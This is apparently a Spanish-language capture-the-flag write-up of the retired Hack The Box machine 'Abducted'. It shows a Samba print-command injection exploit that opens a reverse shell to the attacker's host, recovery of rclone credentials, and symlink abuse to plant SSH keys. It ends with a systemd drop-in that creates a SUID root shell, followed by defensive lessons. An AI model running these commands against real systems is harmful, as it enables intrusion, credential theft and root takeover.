
# Writeup: Abducted (Hack The Box — Retirada)

Abducted es una máquina **Media** que simula un entorno Linux con un servidor Samba expuesto. El recorrido comienza con la explotación de una vulnerabilidad crítica en el subsistema de impresión de Samba (CVE-2026-4480) que permite obtener una reverse shell como el usuario `nobody`. A partir de ahí, se encuentra un archivo de configuración de `rclone` con credenciales que permiten escalar al usuario `scott`. Posteriormente, se abusa de una combinación de directivas SMB (`force user` + `wide links`) para escribir una clave pública SSH en el directorio de `marcus`. Finalmente, se explota un grupo `operators` con permisos de escritura sobre la configuración de systemd de `smbd` para escalar a root.


## Fase 1: Reconocimiento

Lanzamos un escaneo completo de puertos con Nmap:

```bash
sudo nmap -sS --min-rate 500 -p- -n -Pn -vv 10.129.244.177 -oG allPorts
```

El escaneo reveló tres puertos abiertos:

```bash
Discovered open port 445/tcp on 10.129.244.177
Discovered open port 139/tcp on 10.129.244.177
Discovered open port 22/tcp on 10.129.244.177
```

Realizamos un escaneo de servicios y versiones:

```bash
nmap -sVC -p 22,139,445 10.129.244.177 -oN targeted
```

**Resultado:**

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-03T00:24:00
|_  start_date: N/A
|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

El servidor Samba revela el nombre NetBIOS **`ABDUCTED`**.

---

## Fase 2: Enumeración SMB

Usamos `nxc` para enumerar los recursos compartidos con autenticación nula (usuario `guest` sin contraseña):

```bash
nxc smb 10.129.244.177 -u 'guest' -p '' --shares
```

**Resultado:**

```bash
SMB         10.129.244.177  445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.177  445    ABDUCTED         [+] ABDUCTED\guest: (Guest)
SMB         10.129.244.177  445    ABDUCTED         [*] Enumerated shares
SMB         10.129.244.177  445    ABDUCTED         Share           Permissions     Remark
SMB         10.129.244.177  445    ABDUCTED         -----           -----------     ------
SMB         10.129.244.177  445    ABDUCTED         HP-Reception    WRITE           Reception printer
SMB         10.129.244.177  445    ABDUCTED         projects                        Hartley Group Project Files
SMB         10.129.244.177  445    ABDUCTED         transfer                        Staff file transfer
SMB         10.129.244.177  445    ABDUCTED         IPC$                            IPC Service (Hartley Group Document Services)
```

El recurso `HP-Reception` tiene permisos de **escritura** y está marcado como "Reception printer". Esto llama la atención, ya que un recurso de impresión con permisos de escritura para invitados puede ser vulnerable a inyección de comandos.

---

## Fase 3: Explotación — CVE-2026-4480 (Samba print-command injection)

Investigando sobre el contexto de "HP-Reception", se trata de una función de escaneo o enrutamiento en dispositivos multifunción HP que permite enviar documentos a carpetas compartidas mediante SMB. Buscando vulnerabilidades asociadas, encontramos el **CVE-2026-4480**.

### ¿Cómo funciona la vulnerabilidad?

Cuando un trabajo de impresión finaliza, Samba ejecuta el comando configurado en `print command` a través de `system()`, sustituyendo `%s` (ruta del archivo spool) y `%J` (nombre del trabajo proporcionado por el cliente). Antes de la corrección, el nombre del trabajo se pasaba con la única transformación `'` → `_`, dejando intactos caracteres como `|`, `;`, `&`, espacios, `<`, `>` y backticks. Un `print command` que referencia `%J` es, por tanto, un sumidero de inyección de comandos, y como los invitados pueden enviar trabajos de impresión, el problema es **pre-autenticación**.

- **CVE:** CVE-2026-4480
- **CVSS:** 10.0
- **Fixed in:** Samba 4.22.10, 4.23.8, 4.24.3
- **Affected:** print backends ejecutando un `print command` externo que referencia `%J` (`printing = sysv`). `printing = cups` / `iprint` no están afectados.

### Explotación

Encontramos un PoC público en GitHub:

```bash
git clone https://github.com/TheCyberGeek/CVE-2026-4480-PoC
```

Ejecutamos el exploit para obtener una reverse shell:

```bash
python3 exploit.py 10.129.244.177 10.10.17.44 443
```

**Salida:**

```bash
[*] target   : 10.129.244.177 (\\10.129.244.177\HP-Reception)
[*] callback : 10.10.17.44:443  (start a listener first: nc -lvnp 443)
[+] print job submitted -- check your listener / out-of-band channel
```

En nuestra máquina Kali, recibimos la conexión:

```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.17.44] from (UNKNOWN) [10.129.244.177] 38284
bash: cannot set terminal process group (1731): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

Somos el usuario **`nobody`**.

---

## Fase 4: Enumeración y escalada a `scott`

Enumerando el sistema, encontramos un archivo de configuración de `rclone` en `/opt/offsite-backup/rclone.conf`:

```bash
nobody@abducted:/$ cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

La contraseña está ofuscada. Usamos `rclone reveal` para desofuscarla:

```bash
nobody@abducted:/$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
```

Obtenemos la contraseña: **`iXzvcib3SrpZ`**.

Enumerando los usuarios del sistema:

```bash
nobody@abducted:/$ ls /home
marcus  scott
```

Probamos la contraseña con ambos usuarios:

```bash
nobody@abducted:/$ su scott
Password: iXzvcib3SrpZ
scott@abducted:/$
```

¡Funciona! Somos el usuario **`scott`**.

---

## Fase 5: Análisis de la configuración de Samba

Como `scott`, leemos la configuración de Samba:

```bash
scott@abducted:~$ cat /etc/samba/smb.conf
```

```ini
[global]
   workgroup = WORKGROUP
   server string = Hartley Group Document Services
   netbios name = ABDUCTED
   map to guest = Bad User
   guest account = nobody
   security = user
   printing = sysv
   load printers = no
   disable spoolss = no
   unix extensions = no
   allow insecure wide links = yes
   log level = 0
   include = /etc/samba/shares.conf
```

```bash
scott@abducted:~$ cat /etc/samba/shares.conf
```

```ini
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

### Vulnerabilidad: Configuración insegura de SMB

El recurso `[transfer]` combina dos directivas peligrosas:

- **`force user = marcus`**: Fuerza a que todas las operaciones sobre archivos se ejecuten con el UID de `marcus`, independientemente del usuario autenticado.
- **`wide links = yes`**: Permite que los enlaces simbólicos dentro del árbol compartido apunten a rutas fuera de él.

Un atacante con acceso al recurso puede crear un enlace simbólico a cualquier directorio del sistema y, debido a `force user`, escribir archivos como `marcus`.

### Explotación

Desde la shell de `scott`, creamos un enlace simbólico al directorio de `marcus`:

```bash
scott@abducted:/$ ln -s /home/marcus/ /srv/transfer/marcus
```

Usamos `smbclient` para conectarnos al recurso `transfer` como `scott`:

```bash
smbclient //10.129.244.177/transfer -U 'scott%iXzvcib3SrpZ'
```

```bash
smb: \> ls
  .                                   D        0  Fri Jul  3 17:29:43 2026
  ..                                  D        0  Fri Jul  3 17:29:43 2026
  marcus                              D        0  Thu Jun  4 09:47:57 2026

smb: \> cd marcus\
smb: \marcus\> mkdir .ssh
smb: \marcus\.ssh\> put /home/kali/.ssh/marcus_key.pub authorized_keys
putting file /home/kali/.ssh/marcus_key.pub as \marcus\.ssh\authorized_keys (0.9 kB/s) (average 0.9 kB/s)
smb: \marcus\.ssh\> setmode authorized_keys a-r
smb: \marcus\> setmode .ssh a-r+d
```

Ahora, nos conectamos por SSH como `marcus`:

```bash
ssh -i /home/kali/.ssh/marcus_key marcus@10.129.244.177
```

```bash
marcus@abducted:~$ whoami
marcus
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

Somos el usuario **`marcus`** y pertenecemos al grupo **`operators`** (GID 1000).

---

## Fase 6: Escalada a root

### Enumeración de permisos del grupo `operators`

Buscamos archivos/directorios con el GID 1000:

```bash
marcus@abducted:~$ find / -group 1000 2>/dev/null
/etc/systemd/system/smbd.service.d
```

El directorio `/etc/systemd/system/smbd.service.d/` tiene permisos:

```bash
drwxrws---  2 root operators 4096 /etc/systemd/system/smbd.service.d/
```

- **`g+s` (setgid)**: Cualquier archivo creado hereda el grupo `operators`.
- **Permiso de escritura para el grupo**: `marcus` puede crear/modificar archivos en ese directorio.

Además, `marcus` tiene privilegios para reiniciar servicios mediante `systemctl`.

### Creación del drop-in override de systemd

Creamos un archivo de configuración que añade un comando a ejecutarse al iniciar `smbd`:

```bash
marcus@abducted:/etc/systemd/system/smbd.service.d$ echo -e "[Service]\nExecStartPre=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'" > override.conf
```

- **`ExecStartPre`**: Comando ejecutado **antes** de iniciar el servicio principal.
- Como `smbd` se ejecuta como **root**, el comando se ejecuta con privilegios de root.
- Copia `/bin/bash` a `/tmp/rootbash` y le aplica permisos **SUID** (`chmod 4755`).

### Activación del código malicioso

```bash
marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl daemon-reload
marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl restart smbd
```

Al reiniciar `smbd`, systemd ejecuta el comando como root, generando un binario SUID en `/tmp/rootbash`:

```bash
marcus@abducted:/etc/systemd/system/smbd.service.d$ ls -la /tmp
-rwsr-xr-x  1 root root 1446024 Jul  3 21:56 rootbash
```

### Obtención de shell root

```bash
marcus@abducted:/etc/systemd/system/smbd.service.d$ /tmp/rootbash -p
rootbash-5.2# whoami
root
rootbash-5.2# cat /root/root.txt
[REDACTED]
```

¡Obtenemos la **flag de root**!

---

## Conclusión

Abducted es una máquina **Media** que combina:

1. **Explotación de CVE-2026-4480** en el subsistema de impresión de Samba para obtener una reverse shell como `nobody`.
2. **Enumeración de archivos de configuración** (rclone) para obtener credenciales y escalar a `scott`.
3. **Abuso de configuraciones SMB inseguras** (`force user` + `wide links`) para escribir una clave pública SSH y escalar a `marcus`.
4. **Explotación de permisos de grupo `operators`** sobre la configuración de systemd para inyectar un comando como root y escalar a privilegios máximos.

---

## Lecciones aprendidas

1. **Las vulnerabilidades en Samba pueden ser críticas**  
   CVE-2026-4480 permite ejecución remota de comandos sin autenticación. Mantener Samba actualizado y evitar `print command` con `%J` sin sanitización es fundamental.

2. **Los archivos de configuración almacenan información sensible**  
   El archivo `rclone.conf` contenía credenciales ofuscadas que pudieron ser reveladas con `rclone reveal`. Estos archivos deben tener permisos restrictivos.

3. **Las combinaciones de directivas SMB pueden romper el aislamiento**  
   `force user` + `wide links` permite escritura fuera del árbol compartido. Nunca habilitar `wide links` en recursos compartidos con `force user`.

4. **Los permisos de grupo mal configurados permiten escalada de privilegios**  
   El grupo `operators` tenía permisos de escritura sobre la configuración de systemd, lo que permitió inyectar comandos en un servicio que se ejecuta como root.

5. **Systemd drop-ins son poderosos y peligrosos**  
   La capacidad de modificar la configuración de servicios críticos debe estar estrictamente restringida.
